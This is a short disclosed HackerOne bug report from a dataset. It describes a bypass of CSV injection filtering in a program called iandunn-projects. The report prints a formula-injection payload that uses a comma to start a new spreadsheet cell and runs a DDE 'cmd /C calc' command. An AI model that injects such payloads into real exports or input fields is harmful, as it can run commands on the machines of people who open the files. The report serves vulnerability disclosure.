---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '161290'
original_report_id: '161290'
title: bypass to csv injection
weakness: Command Injection - Generic
team_handle: iandunn-projects
created_at: '2016-08-19T11:48:57.148Z'
disclosed_at: '2016-09-27T21:45:51.962Z'
has_bounty: false
visibility: full
substate: not-applicable
vote_count: 1
tags:
- hackerone
- command-injection-generic
---

# bypass to csv injection

## Metadata

- HackerOne Report ID: 161290
- Weakness: Command Injection - Generic
- Program: iandunn-projects
- Disclosed At: 2016-09-27T21:45:51.962Z
- Has Bounty: No
- Visibility: full
- Substate: not-applicable

## Original Report

Hi Ian,
I would like to add payload to this report #151516.  
payload used:
http://google.com?,=2+2-2+3+cmd|' /C calc'!G2

When injecting https://google.com? it will be rendered as a link but when comma (,) it will be rendered in a new cell which will execute the command.

Thanks,

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
